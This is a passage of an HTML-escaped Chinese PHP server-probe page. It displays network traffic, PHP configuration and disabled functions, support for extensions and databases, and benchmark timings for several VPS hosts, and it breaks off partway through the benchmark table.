		&lt;td colspan&#x3D;&quot;5&quot; class&#x3D;&quot;w_number&quot;&gt;&lt;span id&#x3D;&quot;loadAvg&quot;&gt;&lt;?php echo $load;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;
	&lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;?&#125;?&gt;



&lt;?php if (false !&#x3D;&#x3D; ($strs &#x3D; @file(&quot;&#x2F;proc&#x2F;net&#x2F;dev&quot;))) : ?&gt;

&lt;table&gt;

    &lt;tr&gt;&lt;th colspan&#x3D;&quot;5&quot;&gt;网络使用状况&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

&lt;?php for ($i &#x3D; 2; $i &lt; count($strs); $i++ ) : ?&gt;

&lt;?php preg_match_all( &quot;&#x2F;([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)&#x2F;&quot;, $strs[$i], $info );?&gt;

     &lt;tr&gt;

        &lt;td width&#x3D;&quot;13%&quot;&gt;&lt;?php echo $info[1][0]?&gt; : &lt;&#x2F;td&gt;
        &lt;td width&#x3D;&quot;29%&quot;&gt;入网: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetInput&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetInput[$i]?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
		&lt;td width&#x3D;&quot;14%&quot;&gt;实时: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetInputSpeed&lt;?php echo $i?&gt;&quot;&gt;0B&#x2F;s&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
        &lt;td width&#x3D;&quot;29%&quot;&gt;出网: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetOut&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetOut[$i]?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
		&lt;td width&#x3D;&quot;14%&quot;&gt;实时: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetOutSpeed&lt;?php echo $i?&gt;&quot;&gt;0B&#x2F;s&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;

    &lt;&#x2F;tr&gt;

&lt;?php endfor; ?&gt;

&lt;&#x2F;table&gt;

&lt;?php endif; ?&gt;



&lt;table width&#x3D;&quot;100%&quot; cellpadding&#x3D;&quot;3&quot; cellspacing&#x3D;&quot;0&quot; align&#x3D;&quot;center&quot;&gt;

  &lt;tr&gt;

    &lt;th colspan&#x3D;&quot;4&quot;&gt;PHP已编译模块检测&lt;&#x2F;th&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td colspan&#x3D;&quot;4&quot;&gt;&lt;span class&#x3D;&quot;w_small&quot;&gt;

&lt;?php

$able&#x3D;get_loaded_extensions();

foreach ($able as $key&#x3D;&gt;$value) &#123;

	if ($key!&#x3D;0 &amp;&amp; $key%13&#x3D;&#x3D;0) &#123;

		echo &#39;&lt;br &#x2F;&gt;&#39;;

	&#125;

	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;

&#125;

?&gt;&lt;&#x2F;span&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_php&quot;&gt;&lt;&#x2F;a&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;PHP相关参数&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;PHP信息（phpinfo）：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;

		&lt;?php

		$phpSelf &#x3D; $_SERVER[PHP_SELF] ? $_SERVER[PHP_SELF] : $_SERVER[SCRIPT_NAME];

		$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);

		?&gt;

    &lt;?php echo (false!&#x3D;&#x3D;eregi(&quot;phpinfo&quot;,$disFuns))? &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39; :&quot;&lt;a href&#x3D;&#39;$phpSelf?act&#x3D;phpinfo&#39; target&#x3D;&#39;_blank&#39;&gt;PHPINFO&lt;&#x2F;a&gt;&quot;;?&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;PHP版本（php_version）：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo PHP_VERSION;?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP运行方式：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo strtoupper(php_sapi_name());?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;脚本占用最大内存（memory_limit）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;memory_limit&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP安全模式（safe_mode）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;safe_mode&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;POST方法提交最大限制（post_max_size）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;post_max_size&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;上传文件最大限制（upload_max_filesize）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;upload_max_filesize&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;浮点型数据显示的有效位数（precision）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;precision&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;脚本超时时间（max_execution_time）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;max_execution_time&quot;);?&gt;秒&lt;&#x2F;td&gt;

    &lt;td&gt;socket超时时间（default_socket_timeout）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;default_socket_timeout&quot;);?&gt;秒&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP页面根目录（doc_root）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;doc_root&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;用户根目录（user_dir）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;user_dir&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dl()函数（enable_dl）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;enable_dl&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;指定包含文件目录（include_path）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;include_path&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;显示错误信息（display_errors）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;display_errors&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;自定义全局变量（register_globals）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_globals&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;数据反斜杠转义（magic_quotes_gpc）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&quot;&lt;?...?&gt;&quot;短标签（short_open_tag）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;short_open_tag&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;&quot;&lt;% %&gt;&quot;ASP风格标记（asp_tags）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;asp_tags&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;忽略重复错误信息（ignore_repeated_errors）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_errors&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;忽略重复的错误源（ignore_repeated_source）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_source&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;报告内存泄漏（report_memleaks）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;report_memleaks&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;自动字符串转义（magic_quotes_gpc）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;外部字符串自动转义（magic_quotes_runtime）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_runtime&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;打开远程文件（allow_url_fopen）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;声明argv和argc变量（register_argc_argv）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_argc_argv&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Cookie 支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isset($_COOKIE)?&#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;拼写检查（ASpell Library）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;aspell_check_raw&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
   &lt;tr&gt;
    &lt;td&gt;高精度数学运算（BCMath）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;PREL相容语法（PCRE）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;&#x2F;td&gt;
   &lt;tr&gt;
    &lt;td&gt;PDF文档支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;pdf_close&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SNMP网络管理协议：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;snmpget&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;VMailMgr邮件处理：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;vm_adduser&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;Curl支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;curl_init&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;SMTP支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?&#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SMTP地址：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?get_cfg_var(&quot;SMTP&quot;):&#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

	&lt;tr&gt;
		&lt;td&gt;默认支持函数（enable_functions）：&lt;&#x2F;td&gt;
		&lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;a href&#x3D;&#39;&lt;?php echo $phpSelf;?&gt;?act&#x3D;Function&#39; target&#x3D;&#39;_blank&#39; class&#x3D;&#39;static&#39;&gt;请点这里查看详细！&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;		
	&lt;&#x2F;tr&gt;
	&lt;tr&gt;
		&lt;td&gt;被禁用的函数（disable_functions）：&lt;&#x2F;td&gt;
		&lt;td colspan&#x3D;&quot;3&quot; class&#x3D;&quot;word&quot;&gt;
&lt;?php 
$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);
if(empty($disFuns))
&#123;
	echo &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;
&#125;
else
&#123; 
	&#x2F;&#x2F;echo $disFuns;
	$disFuns_array &#x3D;  explode(&#39;,&#39;,$disFuns);
	foreach ($disFuns_array as $key&#x3D;&gt;$value) 
	&#123;
		if ($key!&#x3D;0 &amp;&amp; $key%5&#x3D;&#x3D;0) &#123;
			echo &#39;&lt;br &#x2F;&gt;&#39;;
	&#125;
	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;
&#125;	
&#125;

?&gt;
		&lt;&#x2F;td&gt;
	&lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_module&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--组件信息--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot; &gt;组件支持&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;FTP支持：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;ftp_login&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;XML解析支持：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;xml_set_object&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Session支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;session_start&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Socket支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;socket_accept&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Calendar支持&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&#39;cal_days_in_month&#39;);?&gt;
	&lt;&#x2F;td&gt;

    &lt;td&gt;允许URL打开文件：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;GD库支持：&lt;&#x2F;td&gt;

    &lt;td&gt;

    &lt;?php

        if(function_exists(gd_info)) &#123;

            $gd_info &#x3D; @gd_info();

	        echo $gd_info[&quot;GD Version&quot;];

	    &#125;else&#123;echo &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;&#125;

	?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;压缩文件支持(Zlib)：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;gzclose&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;IMAP电子邮件系统函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;imap_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;历法运算函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;JDToGregorian&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;正则表达式函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;WDDX支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;wddx_add_vars&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Iconv编码转换：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;iconv&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;mbstring：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mb_eregi&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;高精度数学运算：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;LDAP目录协议：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ldap_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;MCrypt加密处理：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mcrypt_cbc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;哈稀计算：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mhash_count&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_module_other&quot;&gt;&lt;&#x2F;a&gt;
&lt;!--第三方组件信息--&gt;
&lt;table&gt;
  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot; &gt;第三方组件&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td width&#x3D;&quot;32%&quot;&gt;Zend版本&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php $zend_version &#x3D; zend_version();if(empty($zend_version))&#123;echo &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125;else&#123;echo $zend_version;&#125;?&gt;&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;32%&quot;&gt;
&lt;?php
$PHP_VERSION &#x3D; PHP_VERSION;
$PHP_VERSION &#x3D; substr($PHP_VERSION,2,1);
if($PHP_VERSION &gt; 2)
&#123;
	echo &quot;ZendGuardLoader[启用]&quot;;
&#125;
else
&#123;
	echo &quot;Zend Optimizer&quot;;
&#125;
?&gt;
	&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php if($PHP_VERSION &gt; 2)&#123;echo (get_cfg_var(&quot;zend_loader.enable&quot;))?&#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;&#39;:&#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125; else&#123;if(function_exists(&#39;zend_optimizer_version&#39;))&#123;	echo zend_optimizer_version();&#125;else&#123;	echo (get_cfg_var(&quot;zend_optimizer.optimization_level&quot;)||get_cfg_var(&quot;zend_extension_manager.optimizer_ts&quot;)||get_cfg_var(&quot;zend.ze1_compatibility_mode&quot;)||get_cfg_var(&quot;zend_extension_ts&quot;))?&#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;&#39;:&#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125;&#125;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;eAccelerator&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;eAccelerator&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;eAccelerator&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;ioncube&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if(extension_loaded(&#39;ionCube Loader&#39;))&#123;   $ys &#x3D; ioncube_loader_iversion();   $gm &#x3D; &quot;.&quot;.(int)substr($ys,3,2);   echo ionCube_Loader_version().$gm;&#125;else&#123;echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;XCache&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;XCache&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;XCache&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;APC&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;APC&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;APC&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_db&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--数据库支持--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;数据库支持&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;MySQL 数据库：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;mysql_close&quot;);?&gt;

    &lt;?php
    if(function_exists(&quot;mysql_get_server_info&quot;)) &#123;

        $s &#x3D; @mysql_get_server_info();

        $s &#x3D; $s ? &#39;&amp;nbsp; mysql_server 版本：&#39;.$s : &#39;&#39;;

	    $c &#x3D; &#39;&amp;nbsp; mysql_client 版本：&#39;.@mysql_get_client_info();

        echo $s;

    &#125;

    ?&gt;

	&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;ODBC 数据库：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;odbc_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Oracle 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ora_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;SQL Server 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mssql_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dBASE 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;dbase_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;mSQL 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;msql_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;SQLite 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php if(extension_loaded(&#39;sqlite3&#39;)) &#123;$sqliteVer &#x3D; SQLite3::version();echo &#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;　&#39;;echo &quot;SQLite3　Ver &quot;;echo $sqliteVer[versionString];&#125;else &#123;echo isfun(&quot;sqlite_close&quot;);if(isfun(&quot;sqlite_close&quot;) &#x3D;&#x3D; &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39;) &#123;echo &quot;&amp;nbsp; 版本： &quot;.@sqlite_libversion();&#125;&#125;?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Hyperwave 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;hw_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Postgre SQL 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;pg_close&quot;); ?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Informix 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ifx_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;DBA 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dba_close&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;DBM 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dbmclose&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;    
  &lt;tr&gt;
    &lt;td&gt;FilePro 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;filepro_fieldcount&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SyBase 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;sybase_close&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_performance&quot;&gt;&lt;&#x2F;a&gt;&lt;a name&#x3D;&quot;bottom&quot;&gt;&lt;&#x2F;a&gt;

&lt;form action&#x3D;&quot;&lt;?php echo $_SERVER[PHP_SELF].&quot;#bottom&quot;;?&gt;&quot; method&#x3D;&quot;post&quot;&gt;

&lt;!--服务器性能检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;5&quot;&gt;服务器性能检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td width&#x3D;&quot;19%&quot;&gt;参照对象&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;整数运算能力检测&lt;br &#x2F;&gt;(1+1运算300万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;浮点运算能力检测&lt;br &#x2F;&gt;(圆周率开平方300万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;数据I&#x2F;O能力检测&lt;br &#x2F;&gt;(读取10K文件1万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;30%&quot;&gt;CPU信息&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr align&#x3D;&quot;center&quot;&gt;
    &lt;td align&#x3D;&quot;left&quot;&gt;美国 LinodeVPS&lt;&#x2F;td&gt;
    &lt;td&gt;0.357秒&lt;&#x2F;td&gt;
    &lt;td&gt;0.802秒&lt;&#x2F;td&gt;
    &lt;td&gt;0.023秒&lt;&#x2F;td&gt;
    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Xeon L5520 @ 2.27GHz&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 PhotonVPS.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.431秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.024秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.034秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;8 x Xeon E5520 @ 2.27GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;德国 SpaceRich.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.421秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.003秒&lt;&#x2F;td&gt;

